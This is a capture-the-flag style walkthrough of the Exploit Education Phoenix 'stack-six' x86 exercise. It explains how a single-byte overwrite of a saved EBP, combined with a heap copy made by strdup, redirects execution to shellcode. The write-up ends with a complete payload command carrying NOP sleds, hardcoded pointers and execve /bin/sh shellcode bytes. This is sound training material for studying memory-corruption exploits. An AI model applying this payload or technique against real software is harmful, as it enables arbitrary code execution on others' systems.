# https://exploit.education/phoenix/stack-six/ (x86)

### This challenge is pretty cool. It's main point is to show you that sometimes even even with an overwrite of a single byte (which is not even a return address), you can still achieve arbitrary code execution. Below is the step by step walkthrough on how to spawn /bin/sh in this exercise
* The first thing to notice here is that you can only overwrite a single (least significant) byte of previous function ```EBP``` register stored on stack. By playing around with the total size of ```ExploitEducation``` environment variable (possibly could also work if you played with other environment variables instead), you can adjust the stack location in such a way that the new 'patched' ```EBP``` value stored on stack points to the region in stack which is controled by you 
* If all we can do is to change the ```EBP``` value that belongs to the previous function, we need to look at it and see how does this influence its flow. Looking at *main* code just after the vulnerable *greet* returns :   
```C hl_lines="1 2"
   0x0804865a <+79>:    call   0x8048585 <greet> ; <---- call to vulnerable function
   0x0804865f <+84>:    add    esp,0x10
   0x08048662 <+87>:    sub    esp,0xc
   0x08048665 <+90>:    push   eax
   0x08048666 <+91>:    call   0x8048390 <puts@plt>
   0x0804866b <+96>:    add    esp,0x10
   0x0804866e <+99>:    mov    eax,0x0
   0x08048673 <+104>:   mov    ecx,DWORD PTR [ebp-0x4] < -----
   0x08048676 <+107>:   leave
   0x08048677 <+108>:   lea    esp,[ecx-0x4] <------
   0x0804867a <+111>:   ret

```
  * So in theory, if we could cause ```EBP - 4``` to point a memory address, just above which is yet another pointer to our shellcode, we could make the ```ret``` command to jump to it. So all we need to do is to play around with ```ExploitEducation``` to have our shell code + the mentioned above pointers + override the one byte of stored ```EBP``` value of *main* . Right ? Wrong !
  * Notice the call to *puts* before reaching the interesting opcodes where our games with pointer to pointer causes ret to jump to our shellcode. Since the area in stack where our shellcode is stored (thanks to buggy strncpy in *greet* ) is considered to be free and available by the *main* function, it overrides almost all of it in that *puts* call ... :(
  * So what can be done ? So first of all, after playing a bit with debugger we discover that some values in that stack are left intack after all. After some experiments we can find a couple of addresses which we can use to store that first pointer to which we can safely point our overriden ```EBP```.
  * But where that first pointer shall point ? The bytes in stack, that are not ruined by that *puts* call are not enough to store our shellcode ... Well luckily that *strdup* at the end of *greet* call comes to our rescue ! Our whole buffer with the shellcode is preserved inside the heap ! So we can point that pointer to an address in heap where the shellcode can be found ! Luckily for us the allocated heap address is always the same in this exercise ....

  ## Putting this all together : 
  ```console

  export ExploitEducation=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 2 + b'\x7c\x99\x04\x08' * 9 + b'\x90' * 16 + b'\x94\x99\x04\x08'*5 + b'\x90' * 28 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80' + b'\x90\x44' + b'B' * 200)")

  ```

  1. A couple of ```NOP```s just in case
  2. The first pointer that points to an address in **HEAP** where the second pointer is stored (duplicated a couple of times just in case)
  3. The second pointer that points to our shellcode in **HEAP** (again duplicated and surrounded by ```NOP```s)
  4. The shellcode
  5. The least significant byte of *main* ```EBP``` register stored on stack overriden in such a way that it points to a first pointer
  6. Additional bytes that do not get copied and do not participate in the exploit, but cause the stack to get adjusted in such a way that last overriden byte of ```EBP``` can be used to point to a region controlled by us (otherwise it can only point to higher addresses which are not controlled by us)